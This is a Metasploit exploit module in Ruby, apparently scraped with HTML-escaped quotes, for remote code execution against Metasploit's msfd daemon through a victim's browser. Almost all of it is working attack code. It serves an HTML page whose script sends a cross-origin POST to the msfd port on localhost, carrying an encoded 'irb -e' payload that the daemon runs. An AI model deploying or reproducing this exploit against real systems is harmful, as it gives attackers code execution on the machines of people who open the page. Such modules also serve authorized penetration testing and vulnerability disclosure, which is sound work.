# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
     &#039;Name&#039;           => &#039;Metasploit msfd Remote Code Execution via Browser&#039;,
     &#039;Description&#039;    => %q{
      Metasploit&#039;s msfd-service makes it possible to get a msfconsole-like
      interface over a TCP socket. This module connects to the msfd-socket
      through the victim&#039;s browser.

      To execute msfconsole-commands in JavaScript from a web application,
      this module places the payload in the POST-data. These POST-requests
      can be sent cross-domain and can therefore be sent to localhost on the
      victim&#039;s machine. The msfconsole-command to execute code is &#039;rbi -e
      "CODE"&#039;.

      Exploitation when the browser is running on Windows is unreliable and
      the exploit is only usable when IE is used and the quiet-flag has been
      passed to msf-daemon.
      },
      &#039;License&#039;        => BSD_LICENSE,
      &#039;Author&#039;         => &#039;Robin Stenvi <robin.stenvi[at]gmail.com>&#039;,
      &#039;Platform&#039;       => &#039;ruby&#039;,
      &#039;Arch&#039;           => ARCH_RUBY,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, {}],
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039; => 8192,  # Arbitrary limit
          &#039;DisableNops&#039; =>  &#039;True&#039;,
          &#039;BadChars&#039; => "\x22\x0a"
        },
      &#039;DisclosureDate&#039; => &#039;Apr 11 2018&#039;,  # Vendor notification
      &#039;DefaultTarget&#039;  => 0))

      register_options([
        OptString.new(&#039;REMOTE_IP&#039;, [true, &#039;Remote IP address when called from victim&#039;, &#039;127.0.0.1&#039;]),
        OptString.new(&#039;REMOTE_PORT&#039;, [true, &#039;Remote port the service is running at&#039;, &#039;55554&#039;])
      ])
  end

  def exploit
    super
  end

  def on_request_uri(cli, request)
    msg = "#{cli.peerhost.ljust(16)} #{self.shortname}"
    sc = payload.encoded
    shellcode = "\\x" + sc.unpack(&#039;U&#039;*sc.length).collect {|x| x.to_s 16}.join("\\x")
    var1 = rand_text_alpha(rand(6..11))
    var2 = rand_text_alpha(rand(6..11))
    html =  <<-EOS
<html>
<head></head>
<body>
<script>
var #{var1} = new XMLHttpRequest();
#{var1}.open("POST","http://#{datastore[&#039;REMOTE_IP&#039;]}:#{datastore[&#039;REMOTE_PORT&#039;]}/", true);
var #{var2} = String("#{shellcode}");
#{var1}.send("irb -e \\"" + #{var2} + "\\"\\n");
</script>
</body>
</html>
EOS
    print_status("#{msg} Sending HTML...")
    send_response(cli, html, { &#039;Content-Type&#039; => &#039;text/html&#039; })
  end
end

